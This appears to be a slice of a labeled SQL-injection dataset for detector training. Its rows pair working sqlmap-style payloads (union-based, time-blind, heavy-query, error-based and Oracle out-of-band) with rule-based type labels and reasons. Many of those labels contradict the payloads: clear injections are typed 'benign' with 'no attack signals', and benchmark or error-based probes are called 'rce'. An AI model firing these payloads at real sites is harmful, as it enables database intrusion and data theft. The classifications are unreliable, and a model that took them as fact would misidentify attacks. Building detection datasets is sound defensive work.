row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8520,"end and ""xlvn"" = ""xlvn",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8521,"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'istb' = 'istb",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
8522,"1' ) ) as mxxd where 7255 = 7255 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
8523,1%' ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8524,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) -- kvkk",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
8525,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8526,"1 ) union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8527,1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'fdbm' like 'fdbm,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
8528,"1"" ) union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8529,"1%"" ) ) and 7358 = 6986--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8530,"iif ( 1149 = 4765,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
8531,"1' in boolean mode ) union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8532,select ( case when ( 6804 = 7050 ) then 6804 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8533,1' ) ) rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8534,"1 ) as agex where 8167 = 8167 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
8535,"-5292' ) union all select 1439,1439,1439,1439#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8536,"1' where 4358 = 4358 union all select null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8537,"1%"" ) ) ) union all select null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8538,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'jmjw' like 'jmjw",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
8539,"1 ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 5130 = 5130",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8540,"1%"" ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8541,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8542,1'+ ( select 'vddk' where 6961 = 6961,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8543,"-2790"" ) ) as vcvw where 6075 = 6075 or 7078 = 8148--",1,,boolean_blind,generic,0.95,6075 = 6075 or detected — boolean_blind injection (priority 8) on generic,rule-based
